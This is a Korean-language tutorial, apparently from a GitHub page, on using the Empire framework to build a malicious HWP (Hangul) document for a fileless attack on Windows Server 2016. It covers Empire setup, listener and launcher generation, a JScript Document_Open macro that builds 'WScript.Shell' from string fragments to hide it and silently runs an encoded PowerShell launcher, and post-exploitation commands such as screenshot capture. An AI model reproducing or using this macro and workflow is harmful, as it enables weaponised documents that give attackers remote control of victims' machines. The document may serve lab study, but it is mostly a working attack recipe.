# 엠파이어(Empire)를 사용해 악성한글문서(Hwp)만들어 파일리스(Fileless) 공격하기

- 공격 서버 :smiling_imp: : 칼리 리눅스(Kali Linux amd64)
- 공격 대상 :skull: : 윈도우 서버 2016 (Windows Server 2016)

### 1. :smiling_imp: 엠파이어(Empire) 설치

```
git clone https://github.com/EmpireProject/Empire.git
cd Empire
sudo setup/install.sh
```

### 2. :smiling_imp: 엠파이어 실행 및 세팅

```
./empire
listeners
uselistener http
set Name something
execute
back
usestager windows/launcher_bat
set Listener something
generate
```

![1](https://i.ibb.co/9txJjB1/Fileless-Empire-hwp-1.png)

### 3. :smiling_imp: 악성 한글 문서 제작

1) 도구 > 보안 설정 > 보안수준 낮음 설정
2) 스크립트 매크로 > 실행 > 코드 편집
3) 항목 > Document / Open

```
function OnDocument_Open()
{
try{
  var ws=new ActiveXObject("W"+ "S"+ "c"+ "ri"+ "p"+ "t"+ ".S" +"he" +"ll");
  // launcher.bat의 powershell 실행 코드
  var ps="powershell -noP -sta -w 1 -enc *****"
  ws.Run(ps,0);
}catch(err){}
```

### 4. :skull: 악성 한글 문서 실행

- 사전 조건 : 백신 OFF, 한글 보안수준 낮음 설정, Windows Defender OFF

한글 문서를 오픈해서 스크립트 코드 실행

### 5. :smiling_imp: 세션 연결 성공 후 공격 가능

```
agents
list
interacct agentName
usemodule [tab][tab]

//example
usemodule collection/screenshot
execute
```
